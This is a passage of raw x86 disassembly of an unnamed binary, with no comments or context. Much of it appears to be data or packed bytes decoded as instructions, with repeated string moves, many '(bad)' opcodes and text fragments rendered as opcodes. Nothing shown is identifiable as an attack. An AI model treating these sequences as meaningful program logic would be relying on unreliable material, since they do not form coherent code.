  4226c2:	fwait
  4226c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226c4:	jae    0x42266b
  4226c6:	popf   
  4226c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226c8:	cmp    DWORD PTR [ebp-0x5a805a6b],esp
  4226ce:	(bad)  
  4226cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226d0:	fwait
  4226d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226d2:	and    DWORD PTR [ebp-0x722f7c2e],0xfffffff0
  4226d9:	in     eax,dx
  4226da:	imul   bh
  4226dc:	push   ss
  4226dd:	iret   
  4226de:	adc    al,0xc9
  4226e0:	xchg   ecx,eax
  4226e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226e2:	cmp    eax,0x51a59ba5
  4226e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226e8:	popf   
  4226e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226ea:	jnp    0x422691
  4226ec:	xchg   ebx,eax
  4226ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226ee:	fwait
  4226ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226f0:	xchg   ecx,eax
  4226f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226f2:	shl    bl,cl
  4226f4:	shr    ch,1
  4226f6:	lock int 0xf6
  4226f9:	iret   
  4226fa:	push   ss
  4226fb:	das    
  4226fc:	adc    al,0x29
  4226fe:	push   ss
  4226ff:	unpcklps xmm1,XMMWORD PTR [ecx]
  422702:	xchg   ebx,eax
  422703:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422704:	adc    DWORD PTR [ebp-0x5ab65a65],esp
  42270a:	lahf   
  42270b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42270c:	cmp    esp,DWORD PTR [ebp-0x5a825a6d]
  422712:	mov    DWORD PTR [ebp-0x5a725a65],esp
  422718:	shl    BYTE PTR [ebx],cl
  42271a:	shr    BYTE PTR ds:0xff60df0,1
  422720:	push   ss
  422721:	outs   dx,DWORD PTR ds:[esi]
  422722:	adc    al,0x69
  422724:	xchg   ecx,eax
  422725:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422726:	add    BYTE PTR [eax],al
  422728:	mov    al,0x25
  42272a:	inc    edx
  42272b:	add    BYTE PTR [edi+eiz*1+0x27c40042],bh
  422732:	inc    edx
  422733:	add    BYTE PTR [ecx+ebp*1+0x42],cl
  422737:	add    BYTE PTR [eax-0x37ffbddb],ch
  42273d:	daa    
  42273e:	inc    edx
  42273f:	add    dh,ch
  422741:	jle    0x422785
  422743:	add    BYTE PTR [esi-0x7f],ah
  422746:	inc    edx
  422747:	add    BYTE PTR [eax+0x3c004228],bh
  42274d:	sub    DWORD PTR [edx+0x0],eax
  422750:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422751:	daa    
  422752:	inc    edx
  422753:	add    BYTE PTR [eax+0x38004227],ch
  422759:	sub    DWORD PTR [edx+0x0],eax
  42275c:	or     al,0x28
  42275e:	inc    edx
  42275f:	add    BYTE PTR [edx-0x36],cl
  422762:	push   es
  422763:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422764:	scas   al,BYTE PTR es:[edi]
  422765:	or     eax,0x27c0a506
  42276a:	inc    edx
  42276b:	add    BYTE PTR [eax+0x28],dh
  42276e:	inc    edx
  42276f:	add    BYTE PTR [eax+ebp*1+0x28900042],al
  422776:	inc    edx
  422777:	add    BYTE PTR [eax-0x7ffbdd8],ah
  42277d:	daa    
  42277e:	inc    edx
  42277f:	add    BYTE PTR [ebp+eiz*1+0x28180042],ch
  422786:	inc    edx
  422787:	add    BYTE PTR [eax],cl
  422789:	sub    BYTE PTR [edx+0x0],al
  42278c:	push   eax
  42278d:	sub    DWORD PTR [edx+0x0],eax
  422790:	scas   al,BYTE PTR es:[edi]
  422791:	fwait
  422792:	push   es
  422793:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422794:	cmp    BYTE PTR [edx-0x19],al
  422797:	mov    esp,0x422828
  42279c:	xor    BYTE PTR [eax],ch
  42279e:	inc    edx
  42279f:	add    ah,cl
  4227a1:	daa    
  4227a2:	inc    edx
  4227a3:	add    BYTE PTR [esi+eax*4],ah
  4227a6:	loopne 0x422764
  4227a8:	jbe    0x422824
  4227aa:	pop    ds
  4227ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227ac:	add    BYTE PTR [eax],al
  4227ae:	inc    eax
  4227af:	add    cl,dh
  4227b1:	retf   
  4227b2:	arpl   WORD PTR [eax+0x63],bx
  4227b5:	add    DWORD PTR [edx+0x0],0x6ae878a8
  4227bc:	ja     0x4227cc
  4227be:	pop    ebx
  4227bf:	xor    BYTE PTR [esi-0x6],dh
  4227c2:	(bad)  
  4227c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227c4:	mov    dl,0xd
  4227c6:	xchg   ebx,eax
  4227c7:	test   eax,0x4227b4
  4227cc:	stos   BYTE PTR es:[edi],al
  4227cd:	fild   DWORD PTR [esi]
  4227cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227d0:	stos   BYTE PTR es:[edi],al
  4227d1:	fild   WORD PTR [esi]
  4227d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227d5:	fild   DWORD PTR [esi]
  4227d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227d8:	mov    ds:0xbea506db,al
  4227dd:	fild   DWORD PTR [esi]
  4227df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227e0:	mov    edx,0xb6a506db
  4227e5:	fild   DWORD PTR [esi]
  4227e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227e8:	mov    dl,0xdb
  4227ea:	push   es
  4227eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227ec:	mov    ds,ebx
  4227ee:	push   es
  4227ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227f0:	mov    bl,bl
  4227f2:	push   es
  4227f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227f4:	out    dx,al
  4227f5:	fild   DWORD PTR [esi]
  4227f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227f8:	dec    DWORD PTR [edx]
  4227fa:	adc    edi,DWORD PTR [ebx]
  4227fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227fd:	and    eax,0x2a950042
  422802:	inc    edx
  422803:	add    BYTE PTR [ecx+0x73],ah
  422806:	push   0x69bae79
  42280b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42280c:	cmp    cl,dl
  42280e:	xlat   BYTE PTR ds:[ebx]
  42280f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422810:	dec    sp
  422812:	add    BYTE PTR [eax],al
  422814:	mov    al,ds:0x22004225
  422819:	inc    edx
  42281a:	sbb    eax,DWORD PTR [ebx+0x0]
	...
  422828:	hlt    
  422829:	stc    
  42282a:	sar    BYTE PTR [edi+edi*4+0x2b309341],cl
  422831:	inc    esi
  422832:	pop    ds
  422833:	jg     0x422835
	...
  422859:	add    BYTE PTR [eax],al
  42285b:	add    dh,ch
  42285d:	jle    0x4228a1
	...
  42286b:	add    BYTE PTR [edi-0x4c],al
  42286e:	inc    ecx
  42286f:	add    BYTE PTR [ebp-0x5b],cl
  422872:	push   ecx
  422873:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422874:	jg     0x42281b
  422876:	inc    edi
  422877:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422878:	push   ecx
  422879:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42287a:	inc    ebx
  42287b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42287c:	std    
  42287d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42287e:	jmp    DWORD PTR [ebp+0xa59b]
  422884:	push   ebp
  422885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422886:	push   ebx
  422887:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422888:	dec    ecx
  422889:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42288a:	std    
  42288b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42288c:	jmp    DWORD PTR [ebp-0x5a8e5a65]
  422892:	jge    0x422839
  422894:	push   ecx
  422895:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422896:	jg     0x42283d
  422898:	std    
  422899:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42289a:	jmp    DWORD PTR [ebp+0xa59b]
  4228a0:	jge    0x422847
  4228a2:	dec    ebx
  4228a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228a4:	inc    ebx
  4228a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228a6:	jne    0x42284d
  4228a8:	pop    ecx
  4228a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228aa:	jnp    0x422851
  4228ac:	dec    ecx
  4228ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228ae:	fwait
  4228af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  4228b8:	xor    eax,ecx
  4228ba:	xor    esp,DWORD PTR [ecx]
  4228bc:	xor    eax,DWORD PTR [ecx]
  4228be:	xor    esp,DWORD PTR [ecx+0x33]
  4228c1:	inc    ecx
  4228c2:	xor    ah,BYTE PTR [ecx-0x1ecd7ece]
  4228c8:	xor    al,cl
  4228ca:	xor    ah,BYTE PTR [ecx]
  4228cc:	xor    al,BYTE PTR [ecx]
  4228ce:	xor    ah,BYTE PTR [ecx+0x32]
  4228d1:	inc    ecx
  4228d2:	xor    eax,DWORD PTR [ecx-0x3ccc1ecd]
  4228d8:	xor    ecx,ebp
  4228da:	xor    ecx,edi
  4228dc:	xor    ecx,ecx
  4228de:	xor    ecx,ebx
  4228e0:	xor    edx,ebp
  4228e2:	xor    edx,edi
  4228e4:	xor    edx,ecx
  4228e6:	xor    edx,ebx
  4228e8:	xor    ebx,ebp
  4228ea:	xor    ebx,edi
  4228ec:	xor    ebx,ecx
  4228ee:	xor    ebx,ebx
  4228f0:	xor    eax,edi
  4228f2:	push   ebx
  4228f3:	shl    DWORD PTR [ebx-0x3f],0x93
  4228f7:	rcl    BYTE PTR [esi-0x55],0x15
  4228fb:	iret   
  4228fc:	xchg   ebp,eax
  4228fd:	dec    eax
  4228fe:	xor    ecx,ebp
  422900:	sbb    eax,0x50aaaae3
  422905:	imul   ebx,DWORD PTR [esi],0x2f
  422908:	je     0x42291f
  42290a:	mov    DWORD PTR [edx+0x556ad694],ecx
  422910:	imul   edi,ebx,0xffffffd5
  422913:	enter  0x4927,0xef
  422917:	popf   
  422918:	mov    dh,0xde
  42291a:	dec    esi
  42291b:	xchg   esp,eax
  42291c:	lock xor BYTE PTR [esi-0x6b],ch
  422920:	inc    ebp
  422921:	or     al,0x76
  422923:	or     DWORD PTR [edi-0x40],eax
  422926:	js     0x4228e2
  422928:	popa   
  422929:	pop    eax
  42292a:	jecxz  0x422996
  42292c:	mov    BYTE PTR [ebx-0x56],0x4
  422930:	cs leave 
  422932:	inc    esi
  422933:	stos   DWORD PTR es:[edi],eax
  422934:	inc    esp
  422935:	ds inc ebp
  422937:	enter  0x82f6,0x93
  42293b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42293c:	sbb    DWORD PTR [eax],ecx
  42293e:	fdivr  DWORD PTR [esp+ebp*1-0x1e]
  422942:	inc    edx
  422943:	add    cl,dl
  422945:	ja     0x4229b6
  422947:	lods   al,BYTE PTR gs:[esi]
  422949:	daa    
  42294a:	inc    edx
  42294b:	add    BYTE PTR [eax],dl
  42294d:	sub    BYTE PTR [edx+0x0],al
  422950:	jbe    0x42294c
  422952:	fbld   TBYTE PTR [eax+eax*1+0x0]
  422959:	add    BYTE PTR [eax],al
  42295b:	add    BYTE PTR [eax],al
  42295d:	add    BYTE PTR [eax],al
  42295f:	add    BYTE PTR [eax-0x15],bl
  422962:	push   ss
  422963:	cmp    eax,0x65646543
  422968:	push   esi
  422969:	imul   ebp,DWORD PTR gs:[esi+0x6f],0x616f7377
  422971:	jb     0x4229e7
  422973:	gs bound esp,QWORD PTR gs:[ecx+0x6c]
  422978:	jecxz  0x422941
  42297a:	shr    DWORD PTR [ebx+edx*8-0x3f],0xa3
  42297f:	cmp    al,BYTE PTR [esi-0x2d]
  422982:	jno    0x4229fe
  422984:	outs   dx,DWORD PTR ds:[esi]
  422985:	jae    0x4229f7
  422987:	popa   
  422988:	je     0x4229f2
  42298a:	bound  esp,QWORD PTR [ecx+0x73]
  42298d:	je     0x4229fe
  42298f:	outs   dx,DWORD PTR ds:[esi]
  422990:	test   eax,0xde3655f5
  422995:	in     al,0x6c
  422997:	jne    0x422a01
  422999:	bound  esp,QWORD PTR [ebp+0x4b]
  42299c:	popa   
  42299d:	jbe    0x422a00
  42299f:	outs   dx,WORD PTR ds:[esi]
  4229a1:	jns    0x422a12
  4229a3:	imul   edi,DWORD PTR [eax],0x2c054cf4
  4229a9:	pusha  
  4229aa:	and    BYTE PTR [edi+0x79],dh
  4229ad:	gs jo  0x422a1f
  4229b0:	ins    DWORD PTR es:[edi],dx
  4229b1:	ja     0x422a2c
  4229b3:	gs inc ebp
  4229b5:	jns    0x422a1c
  4229b7:	jb     0x4229b9
	...
  4229c9:	add    BYTE PTR [eax],al
  4229cb:	add    BYTE PTR [esi-0x4e],dl
  4229ce:	and    dl,BYTE PTR [ecx]
  4229d0:	imul   esp,DWORD PTR [ebx+0x75],0x74
  4229d4:	imul   ebp,DWORD PTR [di+0x70],0xd71e3755
  4229dc:	fldcw  WORD PTR [eax+edx*2]
  4229df:	fimul  WORD PTR [ebx]
  4229e1:	cmp    esi,DWORD PTR [esp+eax*4-0x66]
  4229e5:	fldcw  WORD PTR [eax+0x69]
  4229e8:	lods   al,BYTE PTR ds:[esi]
  4229e9:	repnz retf 0xe41c
  4229ed:	inc    ebx
  4229ee:	outs   dx,DWORD PTR ds:[esi]
  4229ef:	je     0x422a64
  4229f1:	dec    esp
  4229f2:	popa   
  4229f3:	jp     0x422a6e
  4229f5:	push   ebx
  4229f6:	imul   esp,DWORD PTR [ecx+0x73],0x73
  4229fa:	push   0xc3066a00
  4229ff:	lds    eax,FWORD PTR [eax+0x6569646f]
  422a05:	add    al,bl
  422a07:	mov    ebp,0x2ee9d1e4
  422a0c:	jle    0x4229c0
  422a0e:	data16 gs ja 0x422a85
  422a12:	jne    0x422a76
  422a14:	add    BYTE PTR [eax],al
  422a16:	add    DWORD PTR [edx+0x51cf72f8],edi
  422a1c:	fstp   DWORD PTR [eax+0x74]
  422a1f:	popa   
  422a20:	jae    0x422a94
  422a22:	popa   
  422a23:	js     0x422a8d
  422a25:	outs   dx,DWORD PTR ds:[esi]
  422a26:	add    BYTE PTR [eax],al
  422a28:	mov    esi,0x4d270df8
  422a2d:	popa   
  422a2e:	ins    BYTE PTR es:[edi],dx
  422a2f:	je     0x422a7d
  422a31:	jne    0x422aa5
  422a33:	imul   eax,DWORD PTR [eax],0x0
  422a36:	dec    edx
  422a37:	loope  0x422a47
  422a39:	out    0xd3,al
  422a3b:	test   al,0x57
  422a3d:	popa   
  422a3e:	jb     0x422aab
  422a40:	jne    0x422ab6
  422a42:	outs   dx,DWORD PTR fs:[esi]
  422a44:	bound  ebp,QWORD PTR [edi+0x0]
  422a47:	add    BYTE PTR [ebp+eax*1+0x62cfc27],dl
  422a4e:	jne    0x422abd
  422a50:	outs   dx,DWORD PTR ds:[esi]
  422a51:	js     0x422a53
  422a53:	add    BYTE PTR [ecx+edx*8+0x58],ch
  422a57:	or     bh,BYTE PTR [ecx+ebx*2]
  422a5a:	add    al,0xd6
  422a5c:	gs ins DWORD PTR es:[edi],dx
  422a5e:	jns    0x422acf
  422a60:	jo     0x422ad7
  422a62:	je     0x422ab7
  422a64:	push   0x6170676f
  422a69:	jns    0x422ad5
  422a6b:	outs   dx,DWORD PTR ds:[esi]
  422a6c:	popa   
  422a6d:	jns    0x422a29
  422a6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a70:	scas   al,BYTE PTR es:[edi]
  422a71:	or     al,0xaf
  422a73:	adc    al,0x63
  422a75:	popa   
  422a76:	jns    0x422abf
  422a78:	jne    0x422af0
  422a7a:	jae    0x422af0
  422a7c:	imul   esp,DWORD PTR [ebx+0x73],0x61636f6e
  422a83:	jb     0x422aea
  422a85:	imul   ebp,DWORD PTR [ecx+0x25],0xffffffda
  422a89:	(bad)  
  422a8a:	out    dx,al
  422a8b:	push   ebx
  422a8c:	popa   
  422a8d:	arpl   WORD PTR [ebx+0x66],si
  422a90:	imul   esp,DWORD PTR [edx+0x64],0x9780006f
  422a97:	xchg   DWORD PTR [esi-0x7488fe6a],edx
  422a9d:	push   eax
  422a9e:	ja     0x422a2a
  422aa0:	cdq    
  422aa1:	adc    bh,0x8a
  422aa4:	pop    esi
  422aa5:	fldenv [ecx+0x6f5038a6]
  422aab:	adc    bh,0x8b
  422aae:	arpl   WORD PTR [edx],si
  422ab0:	test   eax,0x92fcefd7
  422ab5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ab6:	xchg   ah,bh
  422ab8:	fsubr  st,st(7)
  422aba:	arpl   sp,di
  422abc:	fsub   DWORD PTR [esi+0xc92fc86]
  422ac2:	cdq    
  422ac3:	jo     0x422b39
  422ac5:	xchg   edi,eax
  422ac6:	add    BYTE PTR [edi+0x77019696],0x8b
  422acd:	push   eax
  422ace:	ja     0x422a5a
  422ad0:	adc    BYTE PTR [edi-0x2703a176],0x5b
  422ad7:	cmp    BYTE PTR [eax+0xc],dl
  422ada:	adc    BYTE PTR [edi-0x28089c75],0x9
  422ae1:	xor    BYTE PTR [edi-0x11],0xfc
  422ae5:	xchg   edx,eax
  422ae6:	xor    BYTE PTR [ebp+0x138c6dfc],ah
  422aec:	cld    
  422aed:	xchg   edx,eax
  422aee:	outs   dx,DWORD PTR ds:[esi]
  422aef:	mov    ds:0x31ec92fc,eax
  422af4:	jo     0x422af1
  422af6:	out    dx,al
  422af7:	lea    edx,[edi-0x69697880]
  422afd:	add    DWORD PTR [edi-0x75],esi
  422b00:	push   eax
  422b01:	ja     0x422a8d
  422b03:	adc    BYTE PTR [edi-0x2326a176],0x1c
  422b0a:	hlt    
  422b0b:	push   eax
  422b0c:	or     al,0x80
  422b0e:	xchg   edi,eax
  422b0f:	mov    esp,DWORD PTR [ebx-0x9]
  422b12:	xlat   BYTE PTR ds:[ebx]
  422b13:	out    dx,al
  422b14:	cld    
  422b15:	xchg   edx,eax
  422b16:	mov    WORD PTR [ebx],ss
  422b18:	xor    BYTE PTR [edi-0x11],0xfc
  422b1c:	xchg   edx,eax
  422b1d:	cmp    dl,BYTE PTR [esi+0x65306dfc]
  422b23:	jo     0x422b20
  422b25:	out    dx,al
  422b26:	lea    edx,[edi-0x69697880]
  422b2c:	add    DWORD PTR [edi-0x75],esi
  422b2f:	push   eax
  422b30:	ja     0x422abc
  422b32:	cdq    
  422b33:	adc    bh,0x8a
  422b36:	pop    esi
  422b37:	fsubrp st(7),st
  422b39:	xor    edi,DWORD PTR [eax+edx*2]
  422b3c:	outs   dx,DWORD PTR ds:[esi]
  422b3d:	adc    bh,0x8b
  422b40:	arpl   WORD PTR [edx],si
  422b42:	test   eax,0xd8fca6d7
  422b47:	out    dx,al
  422b48:	fwait
  422b49:	mov    ecx,0x31ec927c
  422b4e:	fwait
  422b4f:	cld    
  422b50:	or     al,0x43
  422b52:	jo     0x422bc8
  422b54:	xchg   edi,eax
  422b55:	add    BYTE PTR [edi+0x77019696],0x8b
  422b5c:	push   eax
  422b5d:	ja     0x422ae9
  422b5f:	adc    BYTE PTR [edi-0x6d1fa176],0x3b
  422b66:	cmp    BYTE PTR [eax+0xc],dl
  422b69:	adc    BYTE PTR [edi-0x28089c75],0xff
  422b70:	xor    BYTE PTR [edi-0x11],0xfc
  422b74:	xchg   edx,eax
  422b75:	out    dx,eax
  422b76:	mov    ds:0x963a6dfc,eax
  422b7b:	cld    
  422b7c:	xchg   edx,eax
  422b7d:	das    
  422b7e:	stos   DWORD PTR es:[edi],eax
  422b7f:	jo     0x422b7c
  422b81:	out    dx,al
  422b82:	lea    ebx,[ebx-0x7f686c67]
  422b88:	xchg   DWORD PTR [eax+0x773a3577],eax
  422b8e:	cmp    eax,0xd7808a0a
  422b93:	sbb    eax,0x9925d73a
  422b98:	adc    bh,0x15
  422b9b:	dec    eax
  422b9c:	shr    DWORD PTR [edx-0x12f24e71],1
  422ba2:	std    
  422ba3:	dec    ebp
  422ba4:	xchg   esp,eax
  422ba5:	test   BYTE PTR [ebx-0x9],cl
  422ba8:	or     cl,BYTE PTR [edi+0x4dfded51]
  422bae:	xchg   esp,eax
  422baf:	test   BYTE PTR [ebx-0x9],cl
  422bb2:	or     cl,BYTE PTR [esi+edi*8]
  422bb5:	or     BYTE PTR ds:0x432187ed,0x6a
  422bbc:	ins    DWORD PTR es:[edi],dx
  422bbd:	or     cl,BYTE PTR [edx]
  422bbf:	or     cl,BYTE PTR [edx]
  422bc1:	or     bl,BYTE PTR [ebx-0x1266f4bd]
  422bc7:	adc    DWORD PTR [ebp+0x5e],ecx
  422bca:	(bad)  
  422bcb:	in     al,dx
  422bcc:	lea    ecx,[ebp+0x10018494]
  422bd2:	pop    ecx
  422bd3:	mov    WORD PTR [ebp-0x1172a173],cs
  422bd9:	(bad)  
  422bda:	out    dx,al
  422bdb:	mov    dh,0xbe
  422bdd:	mov    BYTE PTR [edx+eiz*8+0x2f],0x9f
  422be2:	xchg   BYTE PTR [ecx+0xc],ah
  422be5:	lea    ecx,[ebp+0x5901cbf8]
  422beb:	add    DWORD PTR [ebx-0x80],ebp
  422bee:	out    0x8a,eax
  422bf0:	xor    BYTE PTR [edi+0x32],0x43
  422bf4:	out    0x35,eax
  422bf6:	xor    edi,DWORD PTR [eax+edx*2+0x77]
  422bfa:	xchg   BYTE PTR [edx-0x73],ah
  422bfd:	xchg   BYTE PTR [edi+0x98d8d0c],al
  422c03:	dec    edi
  422c04:	repnz lea ecx,[ebp-0x370f7073]
  422c0b:	xor    esp,edi
  422c0d:	xchg   DWORD PTR [esp+edi*4+0xbefbecd],edx
  422c14:	mov    al,ds:0xec9d8894
  422c19:	or     eax,0xeb6501a9
  422c1e:	mov    dl,0xbc
  422c20:	out    dx,eax
  422c21:	mov    WORD PTR gs:[esi-0x3a17beff],gs
  422c28:	mov    eax,ds:0x99968d8d
  422c2d:	cli    
  422c2e:	lea    edi,[edx]
  422c30:	lea    ecx,[ebp-0x1bc59df6]
  422c36:	push   ebp
  422c37:	and    bh,0x8a
  422c3a:	inc    ebx
  422c3b:	out    0x83,eax
  422c3d:	or     eax,esp
  422c3f:	imul   eax,DWORD PTR [eax-0x43495039],0xffffff80
  422c46:	push   ecx
  422c47:	xor    ecx,DWORD PTR [ebx-0x14]
  422c4a:	push   ecx
  422c4b:	add    ebp,eax
  422c4d:	lock lea eax,[esi-0x7272f3a0]
  422c54:	cmp    ch,0xb2
  422c57:	mov    bh,ch
  422c59:	in     eax,dx
  422c5a:	mov    edx,0xfa05633a
  422c5f:	lea    edi,[edx]
  422c61:	lea    ecx,[ebp-0x39c5e29]
  422c67:	in     al,0x9c
  422c69:	les    esp,FWORD PTR [edi]
  422c6b:	add    bh,0xaf
  422c6e:	xchg   cl,ch
  422c70:	or     al,0x8d
  422c72:	(bad)  
  422c73:	loop   0x422caf
  422c75:	scas   al,BYTE PTR es:[edi]
  422c76:	in     al,dx
  422c77:	sti    
  422c78:	in     al,dx
  422c79:	ret    0x86ed
  422c7c:	cmp    ch,ch
  422c7e:	mov    BYTE PTR [edx],bh
  422c80:	sub    BYTE PTR [edx+0x63],0xfc
  422c84:	sub    BYTE PTR [edx-0x1c],0xb4
  422c88:	scas   al,BYTE PTR es:[edi]
  422c89:	fsubr  st,st(5)
  422c8b:	test   DWORD PTR [edi],ebp
  422c8d:	fiadd  DWORD PTR [eax-0x27f61b02]
  422c93:	in     eax,dx
  422c94:	test   edi,edi
  422c96:	fimul  DWORD PTR [esi-0x1b8ff212]
  422c9c:	out    dx,al
  422c9d:	mov    cs,WORD PTR [ebp+ecx*1-0x5549bc90]
  422ca4:	(bad)  
  422ca5:	leave  
  422ca6:	bound  esi,QWORD PTR [edx-0x367902f3]
  422cac:	or     al,0x8d
  422cae:	(bad)  
  422caf:	xlat   BYTE PTR ds:[ebx]
  422cb0:	adc    eax,0x9faeab9d
  422cb5:	scas   al,BYTE PTR es:[edi]
  422cb6:	lahf   
  422cb7:	dec    ebp
  422cb8:	push   ebp
  422cb9:	xor    eax,0xb5f1aa96
  422cbe:	outs   dx,DWORD PTR ds:[esi]
  422cbf:	lea    ecx,[ebp-0x2c3b7272]
  422cc5:	bound  edx,QWORD PTR [ecx-0x7e7902f3]
  422ccb:	or     al,0x8d
  422ccd:	(bad)  
  422cce:	xlat   BYTE PTR ds:[ebx]
  422ccf:	dec    ecx
  422cd0:	bound  eax,QWORD PTR ds:0x1786fd0d
  422cd6:	or     al,0x8d
  422cd8:	(bad)  
  422cd9:	xlat   BYTE PTR ds:[ebx]
  422cda:	xchg   ebx,eax
  422cdb:	popf   
  422cdc:	mov    WORD PTR gs:[edx+0x30],fs
  422ce0:	in     al,0xc
  422ce2:	(bad)  
  422ce3:	dec    DWORD PTR [edx]
  422ce5:	adc    bh,0x8a
  422ce8:	inc    ebx
  422ce9:	xlat   BYTE PTR ds:[ebx]
  422cea:	and    DWORD PTR [ebx-0x29],0x35
  422cee:	or     edx,ebp
  422cf0:	mov    dh,0x3a
  422cf2:	lea    ecx,[ebp-0x75187fba]
  422cf8:	cmc    
  422cf9:	mov    esi,0x8d8d3adc
  422cfe:	bound  eax,QWORD PTR [edx-0x72c5347a]
  422d04:	lea    eax,[eax+0x23d582d7]
  422d0a:	(bad)  
  422d0b:	stc    
  422d0c:	xchg   BYTE PTR [eax],cl
  422d0e:	cmp    cl,BYTE PTR [ebp+0x7ad7808d]
  422d14:	aad    0x30
  422d16:	adc    bh,0xf7
  422d19:	xor    al,0x7a
  422d1c:	push   eax
  422d1d:	lock test DWORD PTR [eax-0xfaf7d10],0x83f0807a
  422d28:	push   eax
  422d29:	lock adc BYTE PTR [eax-0x29],0x83
  422d2e:	popf   
  422d2f:	stos   DWORD PTR es:[edi],eax
  422d30:	lahf   
  422d31:	icebp  
  422d32:	mov    ebp,0x8e8d8da6
  422d37:	out    dx,eax
  422d38:	in     al,dx
  422d39:	pushf  
  422d3a:	stos   BYTE PTR es:[edi],al
  422d3b:	fwait
  422d3c:	mov    WORD PTR gs:[edi-0x11f31b4e],cs
  422d43:	in     al,dx
  422d44:	or     al,BYTE PTR [eax-0x5795039]
  422d4a:	cmp    cl,BYTE PTR [ebp-0x7fea2873]
  422d50:	ja     0x422cd8
  422d52:	and    bh,0xaf
  422d55:	mov    dl,0x84
  422d57:	in     al,dx
  422d58:	inc    ebx
  422d59:	jo     0x422d3d
  422d5b:	out    dx,eax
  422d5c:	test   eax,0xee7be501
  422d61:	les    edx,FWORD PTR [edi-0x80]
  422d64:	(bad)  
  422d65:	scas   eax,DWORD PTR es:[edi]
  422d66:	in     eax,dx
  422d67:	js     0x422d75
  422d69:	xchg   BYTE PTR [eax],ch
  422d6b:	cmp    cl,BYTE PTR [ebp-0x7fe22873]
  422d71:	ja     0x422cf9
  422d73:	and    bh,0xaf
  422d76:	mov    dl,0x84
  422d78:	in     al,dx
  422d79:	loop   0x422d6a
  422d7b:	lahf   
  422d7c:	loop   0x422d6d
  422d7e:	test   eax,0xee7b6601
  422d83:	cmp    cl,BYTE PTR [ebp+0x6c71c48d]
  422d89:	out    dx,al
  422d8a:	or     al,0x8d
  422d8c:	(bad)  
  422d8d:	in     al,dx
  422d8e:	out    0xaf,eax
  422d90:	loop   0x422e03
  422d92:	lahf   
  422d93:	cli    
  422d94:	lea    edi,[edx]
  422d96:	lea    ecx,[ebp+0x43f9f050]
  422d9c:	push   0x6d
  422d9e:	and    BYTE PTR [ecx-0x7a],0xbd
  422da2:	cmp    cl,BYTE PTR [ebp+0x43fd808d]
  422da8:	push   ecx
  422da9:	in     al,0xc6
  422dab:	cmp    dh,al
  422dad:	stc    
  422dae:	in     eax,dx
  422daf:	out    0x76,eax
  422db1:	out    dx,al
  422db2:	or     ebp,ebp
  422db4:	bound  ecx,QWORD PTR [ebp+0x77ed8d8d]
  422dba:	jbe    0x422d48
  422dbc:	xor    al,0xf9
  422dbf:	in     eax,dx
  422dc0:	retf   
  422dc1:	out    dx,al
  422dc2:	in     al,0xec
  422dc4:	loop   0x422db2
  422dc6:	lahf   
  422dc7:	and    bh,0xfd
  422dca:	mov    dl,0xba
  422dcc:	outs   dx,DWORD PTR ds:[esi]
  422dcd:	inc    ebx
  422dce:	push   0x6d
  422dd0:	loop   0x422e3f
  422dd2:	test   eax,0xadc96601
  422dd7:	in     al,dx
  422dd8:	lea    ecx,[ebp+0x45866180]
  422dde:	cmp    cl,BYTE PTR [ebp+0x43fd808d]
  422de4:	push   ecx
  422de5:	in     al,0xc6
  422de7:	push   eax
  422de8:	lock xchg BYTE PTR [eax-0x10],dl
